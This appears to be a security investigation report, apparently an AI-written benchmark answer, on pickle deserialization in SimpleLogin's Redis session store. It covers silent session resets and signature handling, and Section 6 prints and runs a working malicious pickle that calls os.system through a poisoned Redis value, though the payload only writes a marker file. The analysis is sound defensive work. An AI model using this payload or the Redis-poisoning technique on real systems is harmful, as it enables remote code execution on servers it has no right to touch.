GET /dashboard/ -> status 302 ; pickle.loads invoked = 0 x  (guard 'if val is not None' short-circuits on None)
sid reset: 2ab9a4da-57a7-499c-a269-2183f49da118 -> d264f2d0-9713-46d0-9973-874ff4cd8c43

CONDITION 3b - BAD SIGNATURE COOKIE (rejected before Redis/pickle)
good cookie     = 70655696-0e8b-4914-9c80-2a2b72e01cd0.WuWbkD8pkRfy-h5cBWMaiBVw27Y
tampered cookie = 70655696-0e8b-4914-9c80-2a2b72e01cd0.WuWbkD8pkRfy-h5cBWMaiBVw27A
extract_and_validate_session_id(good)     = 70655696-0e8b-4914-9c80-2a2b72e01cd0
extract_and_validate_session_id(tampered) = None
signer.unsign(tampered) RAISES: BadSignature: Signature b'WuWbkD8pkRfy-h5cBWMaiBVw27A' does not match
request w/ tampered cookie -> status 302 ; pickle.loads invoked = 0 x (sid None -> Redis never read)

CONDITION 3c - TRUNCATED PICKLE (UnpicklingError -> caught)
valid payload len = 244 -> truncated to 15 bytes: b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c'
direct pickle.loads(truncated) RAISES: UnpicklingError: pickle data was truncated
through real path GET /dashboard/: status 302 ; loads invoked 1 x ; swallowed = UnpicklingError('pickle data was truncated')
sid reset: 09ea7cb2-9e49-4fc8-9d70-3ea7abfb9976 -> fea55687-157c-4124-b2a0-a9df3d4adb49

CONDITION 3d - STORED EMPTY b'' VALUE (NOT None: reaches pickle.loads -> EOFError)
redis.get(key) after set(key, b'') = b'' ; (got is None) = False ; (got is not None) = True
direct pickle.loads(b'') RAISES: EOFError: Ran out of input
through real path GET /dashboard/: status 302 ; loads invoked 1 x ; swallowed = EOFError('Ran out of input')
sid reset: dd1d01f4-96ef-4733-a291-4df8f49ae8e3 -> d28f8f34-4d3c-4f96-b37d-23b8c03bf7d1
```

**Interpretation (with citations):**

- **(3a) Deleted / missing Redis value → `None`.** After deleting the key, `redis.get(key)` returns `None` — a *missing* key, which is **distinct** from a key that holds empty bytes (that is 3d below). Because the value is `None`, the `if val is not None:` guard at `app/session.py:74` short-circuits and `pickle.loads` is **never called** (`invoked = 0 x`). `open_session` falls straight through to the fresh-session return at `app/session.py:80`. This is the benign "session expired / evicted" case: a reset with **no deserialization at all**.
- **(3b) `BadSignature` cookie.** Flipping the last character of the signature yields a cookie whose signature no longer matches. `extract_and_validate_session_id` (`app/session.py:47-59`) reads the cookie (`request.cookies.get(app.session_cookie_name)`, `:51`), calls `signer.unsign(...)` (`:56`) which raises `itsdangerous.BadSignature` (`Signature ... does not match`), and the `except itsdangerous.BadSignature: return None` at `:58-59` converts that to `None`. With `session_id is None`, `open_session` returns a fresh session at `:70-71` **without ever reading Redis**, so `pickle.loads invoked = 0 x`. This is the **key contrast**: tampering the *signed id* is detected and rejected **before** any deserialization occurs.
- **(3c) Truncated pickle.** A valid 244-byte payload truncated to its first 15 bytes (`b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c'`) is still recognizable as a protocol-4 pickle header but is incomplete. `pickle.loads` raises `UnpicklingError: pickle data was truncated`, which is caught by the same bare `except Exception: pass` at `app/session.py:78-79` → silent reset (`loads invoked 1 x`, status `302`).
- **(3d) Stored-empty `b''` value → `EOFError`.** This is the case the "deleted key" wording can obscure. Writing an **empty byte string** to the key (`r_write.set(key, b"")`) is **not** equivalent to deleting it: `redis.get(key)` returns `b''`, and `b'' is not None` is `True`, so the `if val is not None:` guard at `app/session.py:74` **passes** and `pickle.loads(b'')` **is** called (`loads invoked 1 x`). `pickle.loads(b'')` raises `EOFError: Ran out of input` (an empty stream carries no opcodes), caught by the same `except Exception: pass` at `app/session.py:78-79` → silent reset (status `302`). The observable contrast is exact: a **deleted** key (3a) reaches the deserializer **0×**, whereas a **stored-empty** key reaches it **1×** and fails with `EOFError` — a difference invisible in the HTTP response (both are a `302`) but real at the `pickle.loads` call site.
- **Scope of what the bare `except` catches (precision).** The reset is triggered by the errors caught at `app/session.py:78`, which is `except Exception:` — **not** `except BaseException:`. Every deserialization failure observed here is an ordinary `Exception` subclass: `UnpicklingError` (invalid opcode in §3, truncation in 3c) and `EOFError` (empty input in 3d) both derive from `Exception`, so all are swallowed. A hypothetical failure *outside* the `Exception` hierarchy (e.g., `KeyboardInterrupt` or `SystemExit`, which derive from `BaseException`) would **not** be swallowed and would propagate. In practice, pickle-decoding failures on malformed input are all `Exception` subclasses, so every malformed / truncated / empty payload is funneled into the same silent reset — but the catch is scoped to `Exception`, not universal.

Taken together, (3a)/(3b) show the two ways `pickle.loads` is **avoided** (missing/deleted Redis value → `None`; rejected signature), while (3c)/(3d) and §3 show the ways it is **reached and fails harmlessly** — an invalid opcode, a truncation, or an empty (`b''`) stream, each raising an `Exception` subclass that the bare `except` swallows into an identical silent reset.


---

## 6. The boundary: harmless reset vs. genuine deserialization risk

**Question (d):** where exactly is the boundary between a benign session reset (non-malicious malformed bytes) and a genuine deserialization risk (a well-formed *malicious* pickle that executes code during `pickle.loads`)?

**Answer:** the boundary is **not** a different code path — it is the *same* `pickle.loads(val)` at `app/session.py:76`. The only difference is whether the attacker-controlled bytes form a **valid, weaponized** pickle program. Non-malicious corruption raises immediately on an invalid/incomplete opcode → harmless silent reset. A crafted pickle whose `__reduce__` returns a callable executes that callable **during** unpickling → arbitrary code execution, *before* the `except` at `app/session.py:78` can run.

> **Safety note.** The demonstration below is deliberately benign: the malicious pickle's *only* effect is to write a marker file `/tmp/pickle_rce_marker`. No destructive action is taken, and the marker is removed afterward. The RCE is **contingent on Redis write access** (the attacker must be able to overwrite `session:<sid>`); it is not reachable by a normal web client.

### 6.1 The malicious pickle (bytes + disassembly)

The payload is `pickle.dumps(Exploit())` where `Exploit.__reduce__` returns `(os.system, (CMD,))` with `CMD` writing the marker file:

```text
malicious pickle bytes (VERBATIM repr) = b"\x80\x04\x95f\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cKecho 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > /tmp/pickle_rce_marker\x94\x85\x94R\x94."
pickletools.dis(malicious):
    0: \x80 PROTO      4
    2: \x95 FRAME      102
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE "echo 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > /tmp/pickle_rce_marker"
  107: \x94 MEMOIZE    (as 3)
  108: \x85 TUPLE1
  109: \x94 MEMOIZE    (as 4)
  110: R    REDUCE
  111: \x94 MEMOIZE    (as 5)
  112: .    STOP
highest protocol among opcodes = 4
```

Note the payload begins with the **same `\x80\x04` PROTO-4 header** as a legitimate session payload (compare §2.2). The `STACK_GLOBAL` opcode resolves `posix.system` (i.e. `os.system`), and the `REDUCE` opcode invokes it with the command-string argument **during unpickling**.

### 6.2 Three observed conditions on the identical code path

```text
(1) ISOLATION - direct pickle.loads(payload):
  marker BEFORE = False
  pickle.loads returned = 0 (os.system exit code)
  marker AFTER = True ; content = ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads

(2) THROUGH REAL open_session PATH (attacker with Redis write):
  login sid = e481f58a-3068-47a5-9155-4ff8a6a82a26 ; marker BEFORE = False
  GET /dashboard/ -> status 302
  marker AFTER = True => RCE inside pickle.loads at app/session.py:76 BEFORE except at :78

(3) CONTRAST benign malformed bytes (identical code path, NOT weaponized):
  GET /dashboard/ -> status 302 ; marker AFTER = False => NO callable invoked (harmless reset)
```

**Interpretation (with citations):**

- **(1) Isolation.** Calling `pickle.loads` directly on the payload executes the command: the marker did not exist before, `pickle.loads` returns `0` (the `os.system` exit code), and the marker exists afterward with the expected content. This proves the payload is a working RCE primitive.
- **(2) Through the real `open_session` path.** After a *genuine* login, overwriting the victim's Redis payload with the malicious pickle and issuing the next real `GET /dashboard/` causes the marker to be created — the code executed **inside `pickle.loads` at `app/session.py:76`**. The request still returns `302` (after the callable runs, unpickling ultimately produces no valid session dict, so the reset proceeds), but the damage is already done: the attacker's code ran *before* the `except` at `app/session.py:78` could intervene. The `except` only runs *after* `loads` returns or raises — by which point the `REDUCE` opcode has already invoked `os.system`.
- **(3) Benign contrast.** The *same* code path with non-weaponized malformed bytes (`b"\x00not a pickle\xff\xfe"`) raises immediately on the invalid opcode, so **no callable is invoked** (marker not created) → a harmless silent reset, exactly as in §3.

**The boundary, stated precisely:** identical entry point, identical `pickle.loads(val)` at `app/session.py:76`, identical silent-reset epilogue. The *sole* discriminator is whether the attacker-controlled bytes constitute a valid, weaponized pickle program. A non-malicious corruption is a harmless silent reset; a crafted pickle is remote code execution. *(Context, not a recommendation: this is the textbook CWE-502 hazard of unpickling untrusted data — see §7.)*

---

## 7. Threat model: signed session-id *pointer* vs. unsigned pickle *payload*

**Sub-question (e):** *Does an attacker who can tamper with the stored session bytes but cannot forge the signed session id meaningfully change the risk?*

**Short answer: No — being unable to forge the signed id does not meaningfully reduce the risk.** The HMAC signature protects only the session-id *pointer* (which Redis key `open_session` reads), not the integrity of the unsigned pickle *payload* that pointer resolves to. An attacker with Redis **write** access therefore reaches `pickle.loads` with attacker-controlled bytes using the victim's *own* valid, unforged cookie. The evidence below was produced by Script B (Appendix A.2) and is the actual, unedited runtime output.

### 7.1 The two artifacts and their integrity properties (observed + cited)

| Artifact | Where produced | Signed / integrity-protected? | Citation |
|----------|----------------|-------------------------------|----------|
| Session-id string (the `slapp` cookie's `<sid>` half) | `save_session` signs it with `self._get_signer(app).sign(...)` | **YES** — `itsdangerous` HMAC-SHA1, `salt="session"`, keyed by `app.secret_key` | `app/session.py:37-41`, `app/session.py:102-114` |
| Pickle payload (the Redis value under `session:<sid>`) | `save_session` writes `pickle.dumps(dict(session))` | **NO** — stored raw and unsigned via `setex` | `app/session.py:91`, `app/session.py:97-101` |

The signer covers the **sid only** (proven byte-for-byte in §2.2: `signer.validate(cookie)=True` and `signer.sign(sid)` reproduces the emitted cookie exactly). Nothing in `open_session` verifies, signs, or authenticates the Redis value before handing it to `pickle.loads` at `app/session.py:76` — the `if val is not None:` guard at `app/session.py:74` is the *only* check, and it tests presence, not integrity.

### 7.2 Signature-independence proof (Evidence 4.7 — verbatim)

Script B logs a victim in, captures the victim's genuine cookie, verifies the signature, then overwrites the victim's Redis payload with the weaponized pickle from §6 and re-checks the signature — **without ever touching the cookie**:

```text
victim cookie = 90cbcb41-db9a-46c5-997c-5bafae214bc9.Mk4xUy3B9a6GsqdHjqFncGKVcEQ
signer.sign(want_bytes(sid)) == emitted cookie ?  True (signs ONLY the sid string, salt='session')
signer.validate(cookie) BEFORE payload tamper = True
signer.validate(cookie) AFTER payload tamper  = True (UNCHANGED => signature independent of payload)
marker BEFORE victim's next request = False
victim's next request (OWN valid unforged cookie) -> status 302 ; marker AFTER = True => legit signed sid POINTED open_session at attacker's unsigned payload -> pickle.loads -> RCE
```

**Interpretation (with citations):**

- **The signature is a function of the sid string alone.** `signer.sign(want_bytes(sid))` reproduces the emitted cookie exactly, and `salt="session"` confirms the signer domain (`app/session.py:37-41`). The signature is computed and verified over the session id, never over the Redis payload.
- **Tampering the payload does not invalidate the cookie.** `signer.validate(cookie)` returns `True` **both before and after** the Redis value is overwritten — the two results are identical (`UNCHANGED`). This is the crux: the integrity check that *does* exist (`extract_and_validate_session_id`, `app/session.py:47-59`) is structurally blind to the payload it points at.
- **The victim's own unforged cookie drives the exploit.** On the victim's next real `GET /dashboard/`, the browser presents the *legitimate* signed cookie. `extract_and_validate_session_id` accepts it (signature valid), `open_session` builds the key `session:<sid>` (`app/session.py:43-45`), `self._redis_r.get(...)` returns the attacker's poisoned bytes (`app/session.py:73`), and `pickle.loads(val)` (`app/session.py:76`) executes the attacker's `__reduce__` callable — the marker is created. The attacker never forged, guessed, or stole the cookie.

**Conclusion for (e):** the signed id is *only a pointer*; the dangerous operation is performed on the *unsigned bytes it points to*. An attacker who can write to Redis but cannot forge the `slapp` cookie is therefore **not meaningfully constrained** — the victim (or any authenticated user whose key the attacker overwrote) supplies the valid pointer for free on their very next request. The inability to forge the id blocks *session hijacking by cookie forgery*, but it does **not** block *deserialization RCE via payload poisoning*, because those are two different attack surfaces protected by two different (and here, only one) integrity mechanisms.

### 7.3 Contingency and scope of the threat (observed boundary conditions)

The exploit is **contingent on Redis write access** and is *not* reachable by a normal web client:

- A normal client can only present a signed cookie. Tampering the signature is rejected at `extract_and_validate_session_id` → `None` (Evidence 4.4, condition 3b: `signer.unsign(tampered)` raises `BadSignature`, `pickle.loads` invoked **0×**). So a browser-only attacker cannot even reach the deserializer with chosen bytes.
- The RCE path opens only when the attacker can **write the Redis value** under an existing (or attacker-created) `session:<sid>` key — a precondition this investigation exercised **directly and at runtime** by overwriting the key from the observation script (§6.2, §7.2). *How* an attacker might obtain that Redis write access in a production deployment was **not observed** here; the following are **inferred, illustrative threat scenarios only** (background context, not runtime-observed): an exposed or compromised Redis instance, an SSRF-to-Redis primitive, a shared multi-tenant cache, or a network-adjacent attacker reaching an unauthenticated Redis port.

This contingency is stated honestly as a *precondition*, not a mitigation: given Redis write access, the signature provides no defense for the payload.

### 7.4 Classification and real-world precedent

This is a textbook instance of **CWE-502 (Deserialization of Untrusted Data)** ([MITRE CWE-502](https://cwe.mitre.org/data/definitions/502.html)), mapping to **OWASP Top 10 2021 category A08:2021 — Software and Data Integrity Failures** ([OWASP A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)). The root property is documented in the official Python standard-library [`pickle` module documentation](https://docs.python.org/3/library/pickle.html), which explicitly warns that the module "is not secure" and that one should only unpickle data one trusts, because maliciously constructed pickle data can execute arbitrary code during unpickling — which is precisely why unpickling untrusted input constitutes CWE-502.

A close, recent real-world analogue is the **python-socketio** advisory [**GHSA-g8c6-8fjj-2r4m**](https://github.com/miguelgrinberg/python-socketio/security/advisories/GHSA-g8c6-8fjj-2r4m) ([**CVE-2025-61765**](https://nvd.nist.gov/vuln/detail/CVE-2025-61765), published October 2025). As described in that upstream advisory, python-socketio multi-server deployments that use a message-queue backend such as Redis encode their inter-server messages with `pickle` and deserialize received messages with `pickle.loads()` on the assumption that the queue is trusted. An attacker who has *already obtained access to that message queue* can therefore place a crafted pickle payload whose `__reduce__` method executes arbitrary code when a receiving server deserializes it. The advisory is explicit that the exposure is gated on backing-store access — single-server deployments without a message queue, and multi-server deployments whose queue is secured, are unaffected — and the maintainer's fix (commit `53f6be0`, released in python-socketio **5.14.0**) removed the pickle-based inter-server encoding in favor of a safer JSON scheme.

The parallel to SimpleLogin's `RedisSessionStore` is exact: the dangerous `pickle.loads` (`app/session.py:76`) runs against bytes fetched from a Redis backing store, and the exploit is reachable **only** when an attacker can write to that store — differing from the socketio case only in that the poisoned bytes arrive via a server-side *session* value rather than an inter-server *message*. *(This paragraph is background context for classification only; per the read-only scope it is explicitly not a remediation proposal.)*

### 7.5 API logout — verified by code reference (NOT runtime-exercised)

The API logout route is covered here by **code reference**, since it was not exercised at runtime. The route `GET /api/logout` (`app/api/views/user_info.py:131`) invokes the **same** `logout_session()` (`app/api/views/user_info.py:140`) demonstrated for web logout in §2.3, then deletes the session cookie (`app/api/views/user_info.py:142`); the route is guarded by `@require_api_auth`. Because it calls the identical teardown function (`logout_session()` → `logout_user()` + `purge_session()`, `app/session.py:117-121`), its session-destruction mechanism is the same as the runtime-exercised web logout. This item is labeled **verified-by-code-reference (same mechanism as web logout)**, *not* runtime-observed, and appears as such in the observed-vs-inferred ledger (§9).


---

## 8. Coverage pass — every sub-question mapped to its answer and evidence

The original question decomposes into five named parts. Each is answered explicitly, next to actual runtime output, as follows:

| # | Sub-question | Answer (one line) | Section | Evidence block | Status |
|---|--------------|-------------------|---------|----------------|--------|
| — | **How is session data deserialized?** | A single `pickle.loads(val)` in `open_session` at `app/session.py:76`; serializer is stdlib `pickle` (protocol 4, `\x80\x04`) after the Py3 `cPickle` `ImportError` fallback at `app/session.py:9-12`. | §2, §3 | 4.0, 4.1, 4.3 | ✅ answered |
| (a) | **Baseline login/logout lifecycle** | Login writes `pickle.dumps(dict(session))` to `session:<sid>` via `setex` (7-day TTL) and sets a signed `slapp` cookie; logout deletes the key + 3 cookies and re-sets a fresh anonymous cookie. | §2 | 4.0, 4.1, 4.2 | ✅ answered |
| (b) | **Corrupted/malformed payload behavior on the next request (fail? silent reset? surfaced error?)** | **Silent reset.** `pickle.loads` raises, `except Exception: pass` (`app/session.py:78-79`) swallows it, a fresh `ServerSession(uuid4)` is returned (`:80`). Response is a normal `302` to `/auth/login` — **no failure, no surfaced error, no 500**. | §3 | 4.3 | ✅ answered |
| (c) | **What appears in the HTTP response and server logs** | Response: normal `302` redirect (no error page). Logs: exactly **one** generic `after_request()` line (`server.py:284`), differing from a normal request only by status (`302` vs `200`); **no** pickle/session/reset-specific log, because `app/session.py` imports no logger (`app/session.py:1-16`). The reset is indistinguishable from "user was never logged in." | §4 | 4.5 | ✅ answered |
| (d) | **Boundary between a harmless reset and a genuine deserialization risk** | Identical code path through `pickle.loads` at `app/session.py:76`. Invalid/benign bytes raise → harmless silent reset. A **valid, weaponized** pickle (`__reduce__` → `STACK_GLOBAL`+`REDUCE`) executes `os.system` *inside* `loads` **before** the `except` at `:78` — RCE. Sole discriminator: is the attacker's byte-string a valid weaponized pickle program? | §6 | 4.6 | ✅ answered |
| (e) | **Threat model: attacker can tamper stored bytes but cannot forge the signed id** | Risk is **not** meaningfully reduced. HMAC signs only the sid *pointer* (`app/session.py:37-41`); the payload is stored raw/unsigned (`app/session.py:91`). Payload tampering leaves `signer.validate(cookie)=True` unchanged; the victim's *own* unforged cookie points `open_session` at poisoned bytes → RCE. CWE-502 / OWASP A08:2021; analogous to GHSA-g8c6-8fjj-2r4m. | §7 | 4.7, 4.8 | ✅ answered |

Supplementary edge/error conditions the question implies (all exercised): deleted/missing Redis value (`None`) — `pickle.loads` never reached (`app/session.py:74` guard, invoked **0×**), §5 / Evidence 4.4(3a); `BadSignature` cookie — rejected pre-Redis (`app/session.py:47-59`, invoked **0×**), §5 / Evidence 4.4(3b); truncated pickle — `UnpicklingError: pickle data was truncated`, caught (invoked **1×**), §5 / Evidence 4.4(3c); stored-empty `b''` value — not `None`, so `pickle.loads` **is** called (invoked **1×**) and raises `EOFError: Ran out of input`, caught, §5 / Evidence 4.4(3d).

---

## 9. Observed-vs-inferred ledger & reproducibility

Per the SWE-AtlasQnA-Repo methodology, every claim is classified below as **observed** (produced at runtime and shown verbatim in §2–§7), **captured** (a byte-sensitive value verified against the exact emitted bytes), or **inferred / code-reference** (not directly runtime-exercised).

| Claim | Classification | Basis |
|-------|----------------|-------|
| Deserializer is stdlib `pickle.loads` at `app/session.py:76` | **Observed** | Counting wrapper recorded `pickle.loads invoked = 1×` on corrupted/truncated paths (Evidence 4.3, 4.4) |
| Pickle protocol = 4 (`\x80\x04` PROTO opcode) | **Captured** | `pickle.DEFAULT_PROTOCOL = 4` printed (4.0); every emitted payload begins `\x80\x04`; confirmed by `pickletools.dis` (4.1, 4.6) |
| `slapp` cookie signature covers the sid only | **Captured** | `signer.validate(cookie)=True` and `signer.sign(sid)` reproduces the emitted cookie byte-for-byte (4.1); unchanged after payload tamper (4.7) |
| Corrupted payload → silent reset (new sid, 302, no error) | **Observed** | sid change + `302` + swallowed `UnpicklingError` captured (4.3) |
| Reset emits no session/pickle-specific log line | **Observed** | `grep` proof of no logger import + fd-level A/B log capture (4.5) |
| Deleted / missing value (`None`) → `pickle.loads` never called | **Observed** | `redis.get = None`, `pickle.loads invoked = 0×` (4.4, 3a) |
| Stored-empty `b''` (not `None`) → `pickle.loads` called once → `EOFError` → reset | **Observed** | `redis.get = b''`, `invoked = 1×`, `EOFError: Ran out of input` swallowed (4.4, 3d) |
| `BadSignature` cookie → rejected before Redis/pickle | **Observed** | `extract_and_validate_session_id(tampered)=None`, `invoked = 0×` (4.4, 3b) |
| Valid weaponized pickle → RCE inside `pickle.loads` | **Observed** | marker file created in isolation *and* through the real `open_session` path (4.6) |
| Payload tampering does not change cookie validity | **Observed** | `signer.validate` identical before/after tamper (4.7) |
| Authenticated TTL = 604800 s (7 days) | **Observed** | `setex` TTL captured on the authenticated key at login (4.1); `ttl = int(app.permanent_session_lifetime.total_seconds())` at `app/session.py:92` |
| Anonymous TTL = 300 s | **Observed** | `setex` TTL captured on the anonymous key re-saved during logout (4.2); `if "_user_id" not in session: ttl = 300` at `app/session.py:95-96` |
| `permanent_session_lifetime = 31 days` at module rest | **Observed (at-rest)** | Printed at import (4.0); overridden per-request to 7 days by `make_session_permanent` (`server.py:204-207`) |
| Legitimate payload keys `{_permanent,_fresh,_user_id,_id,sudo_time}` | **Observed** | `pickle.loads(raw)` dict + `pickletools.dis` (4.1); no `csrf_token` because harness sets `WTF_CSRF_ENABLED=False` |
| API logout (`GET /api/logout`) destroys the session identically | **Inferred / code-reference** | Not runtime-exercised; calls the same `logout_session()` (`app/api/views/user_info.py:131,140,142`) — §7.5 |
| CWE-502 / OWASP A08:2021 classification & GHSA-g8c6-8fjj-2r4m analogy | **Background (external sources)** | Python `pickle` docs, OWASP, and the python-socketio advisory (CVE-2025-61765) — §7.4 |

**Reproducibility.** The evidence blocks embedded verbatim in §2–§7 are the **actual, unedited output of a fresh author rerun** in the native host install (Python 3.10.20, destination working tree) — they are not a re-used capture. Behavior was stable across the two end-to-end runs of the baseline/corrupted/edge script (≈6 logins each) plus the boundary/threat script. Per-run values differ (session ids are fresh `uuid4`s, signatures/`sudo_time`/user-emails vary), but the *structure* and *behavior* are invariant: cookie shape `<sid>.<sig>`, protocol-4 payload starting `\x80\x04`, silent reset on corruption, no reset-specific log, and RCE on a valid weaponized pickle. The flask-login "strong" session fingerprint `_id` (`002d648872…0c0916`) is deterministic for a fixed request environment and was reproduced **byte-identically** across both baseline runs.

---

## Appendix A — The two observation scripts (complete, verbatim, exactly as run)

The two scripts below are reproduced **complete and verbatim — exactly as executed**, with no abbreviation, no comment-elision, and no pseudocode. They were the temporary exercisers that produced the evidence in §2–§7; they lived **outside** the repository (under `/tmp/sl_obs/`) and were removed afterward (Appendix B). A reader can copy each file, stand up the canonical environment exactly as in §1.3, and run it to regenerate structurally-identical evidence (per-run session ids, signatures, and timestamps differ — see §9). Both scripts mirror the canonical `tests/conftest.py` harness exactly: `CONFIG=tests/test.env`, `create_app()`, `TESTING=True`, `WTF_CSRF_ENABLED=False`, `SERVER_NAME="sl.test"`, the `pg_trgm` extension plus `add_sl_domains()` and `add_proton_partner()`, an authenticated user built with **`create_new_user()` imported from `tests/utils.py`** (password `"password"`), and per-test DB isolation via **`connection.begin()`** with a **`transaction.rollback()`** at teardown — **no `Session.commit()` is ever called**, so the database is left unchanged. Redis handles come from `app.session_interface._redis_r` / `._redis_w`; the `login()` helper uses the exact `POST auth.login` template from `tests/auth/test_login.py`. Script A additionally clears any leftover `session:*` keys from earlier runs of *this* investigation before it captures (its targeted-cleanup block at lines 61–66), so the `session:*` key listings in §2 show only the session under test.

### A.1 Script A — baseline lifecycle + corrupted payload + edge/error paths (`/tmp/sl_obs/obs_c.py`)

This is **Script A** (`obs_c.py`). It produces evidence blocks **4.0–4.4**: the environment/activation dump (§2.1), baseline login (§2.2), baseline logout including the decode of the re-saved anonymous payload (§2.3), the corrupted-payload silent reset (§3), and the four edge/error conditions 3a–3d (§5). Its captured stdout was saved as `obs_c.out` and transcribed verbatim into those sections.

```python
"""
Observation Script A -- baseline lifecycle + corrupted payload + edge/error paths.

Exercises the REAL login/logout/request entry points of SimpleLogin with the
custom RedisSessionStore active (MEM_STORE_URI set via tests/test.env) and
records the before/during/after Redis and signed-cookie state for:
  4.0 environment / activation dump
  4.1 baseline login  (POST auth.login)
  4.2 baseline logout (GET  auth.logout) incl. decode of the re-saved payload
  4.3 corrupted payload -> silent reset
  4.4 edge paths: (3a) deleted key, (3b) BadSignature cookie,
                  (3c) truncated pickle, (3d) stored-empty b'' value
The harness mirrors tests/conftest.py exactly: create_app(), TESTING=True,
WTF_CSRF_ENABLED=False, SERVER_NAME="sl.test", pg_trgm + add_sl_domains() +
add_proton_partner(), create_new_user() from tests/utils.py, all wrapped in
connection.begin() and rolled back at teardown. Redis handles come from
app.session_interface._redis_r / ._redis_w.
"""
import os

os.environ["CONFIG"] = os.environ.get("CONFIG") or "tests/test.env"
os.environ.setdefault("GITHUB_ACTIONS_TEST", "true")

import pickle
import pickletools

import sqlalchemy
from flask import testing, url_for, request
import itsdangerous
from psycopg2 import errors
from psycopg2.errorcodes import DEPENDENT_OBJECTS_STILL_EXIST

from app.db import Session, connection, engine
from app import config, constants
import app.session as sessmod
from server import create_app
from init_app import add_sl_domains, add_proton_partner
from tests.utils import create_new_user

# ---- app bootstrap, identical to tests/conftest.py ------------------------
app = create_app()
app.config["TESTING"] = True
app.config["WTF_CSRF_ENABLED"] = False
app.config["SERVER_NAME"] = "sl.test"

with engine.connect() as conn:
    try:
        conn.execute("DROP EXTENSION if exists pg_trgm")
        conn.execute("CREATE EXTENSION pg_trgm")
    except sqlalchemy.exc.InternalError as e:
        if isinstance(e.orig, errors.lookup(DEPENDENT_OBJECTS_STILL_EXIST)):
            print(">>> pg_trgm can't be dropped, ignore")
        conn.execute("Rollback")

add_sl_domains()
add_proton_partner()

sess = app.session_interface            # app.session.RedisSessionStore
r_read, r_write = sess._redis_r, sess._redis_w

# Clean up leftover session:* keys created by earlier observation runs of THIS
# investigation so the key listings below show only the session under test.
# (These are our own prior test artifacts, not real user or parallel-agent data.)
_leftover = r_write.keys('session:*')
if _leftover:
    r_write.delete(*_leftover)

# pass-through counter around the REAL stdlib pickle.loads used by app/session.py
_calls = {"n": 0, "last_exc": None}
_orig_loads = sessmod.pickle.loads


def _counting_loads(b, *a, **k):
    _calls["n"] += 1
    try:
        return _orig_loads(b, *a, **k)
    except Exception as e:
        _calls["last_exc"] = repr(e)
        raise


sessmod.pickle.loads = _counting_loads   # wrapper only; delegates to stdlib


def reset_counter():
    _calls["n"] = 0
    _calls["last_exc"] = None


def getcookie(client, name):
    for c in client.cookie_jar:
        if c.name == name:
            return c.value
    return None


def session_keys():
    return sorted(k.decode() if isinstance(k, bytes) else k
                  for k in r_read.keys("session:*"))


def login(client, email):
    return client.post(
        url_for("auth.login"),
        data={"email": email, "password": "password"},
        follow_redirects=True,
    )


def sep():
    print("-" * 78)


# ---- per-test DB isolation, identical to tests/conftest.py ----------------
transaction = connection.begin()
try:
    with app.app_context():
        config.DISABLE_RATE_LIMIT = True
        signer = sess._get_signer(app)

        # ===== 4.0  environment / activation dump =========================
        print("===== 4.0 ENVIRONMENT / ACTIVATION =====")
        print("session_interface         =",
              type(sess).__module__ + "." + type(sess).__name__)
        print("redis client type         =",
              type(r_read).__module__ + "." + type(r_read).__name__)
        print("SESSION_COOKIE_NAME       =", app.config["SESSION_COOKIE_NAME"])
        print("app.secret_key            =", repr(app.secret_key))
        print("MEM_STORE_URI             =", repr(config.MEM_STORE_URI))
        psl = app.permanent_session_lifetime
        print("permanent_session_lifetime=", psl, "->",
              int(psl.total_seconds()), "s (at rest, before any request)")
        print("pickle.DEFAULT_PROTOCOL   =", pickle.DEFAULT_PROTOCOL,
              "; HIGHEST_PROTOCOL =", pickle.HIGHEST_PROTOCOL)
        print("signer                    =",
              type(signer).__module__ + "." + type(signer).__name__)
        print("signer.digest_method      =", signer.digest_method)
        print("signer.sep                =", repr(signer.sep))

        # ===== 4.1  baseline login ========================================
        print("\n===== 4.1 BASELINE LOGIN (POST auth.login) =====")
        with app.test_client() as client:
            client.environ_base[constants.HEADER_ALLOW_API_COOKIES] = "allow"
            u = create_new_user()
            print("BEFORE login: session:* keys =", session_keys(),
                  "; slapp cookie =", getcookie(client, "slapp"))
            print("login_url =", url_for("auth.login", _external=True),
                  "; logout_url =", url_for("auth.logout", _external=True))

            reset_counter()
            r = login(client, u.email)
            print("POST auth.login -> status", r.status_code,
                  "; authenticated (b'/auth/logout' in body) =",
                  (b"/auth/logout" in r.data))

            cookie = getcookie(client, "slapp")
            sep()
            print("slapp cookie (VERBATIM) =", repr(cookie))
            sid_part, sig_part = cookie.split(".", 1)
            print("  sid_part =", repr(sid_part), "(uuid4)")
            print("  sig_part =", repr(sig_part))
            print("  signer.unsign(cookie) =", signer.unsign(cookie).decode())
            print("  signer.validate(cookie) =", signer.validate(cookie))
            reconstruct = signer.sign(itsdangerous.want_bytes(sid_part)).decode()
            print("  RECONSTRUCT signer.sign(sid_part) == emitted cookie ? ",
                  reconstruct == cookie)

            key = sess._get_key(sid_part)
            raw = r_read.get(key)
            sep()
            print("Redis key                =", key)
            print("Redis raw bytes (VERBATIM repr) =", repr(raw))
            print("first two bytes          =", repr(raw[:2]),
                  "=> PROTO opcode 0x%02x, protocol=%d" % (raw[0], raw[1]))
            print("TTL (setex)              =", r_read.ttl(key), "s")
            print("pickle.loads(raw)        =", _orig_loads(raw))
            print("payload keys (sorted)    =", sorted(_orig_loads(raw).keys()))
            print("pickletools.dis(raw):")
            pickletools.dis(raw)

            # ===== 4.2  baseline logout ===================================
            print("\n===== 4.2 BASELINE LOGOUT (GET auth.logout) =====")
            print("session:* keys BEFORE logout =", session_keys())
            old_key = key
            r2 = client.get(url_for("auth.logout"))
            print("GET auth.logout -> status", r2.status_code,
                  "; Location =", r2.headers.get("Location"))
            print("Set-Cookie headers (VERBATIM, in order):")
            i = 0
            for h, v in r2.headers:
                if h == "Set-Cookie":
                    i += 1
                    print("  %d) %s" % (i, v))
            print("redis GET <old authenticated key> AFTER logout =",
                  r_read.get(old_key))
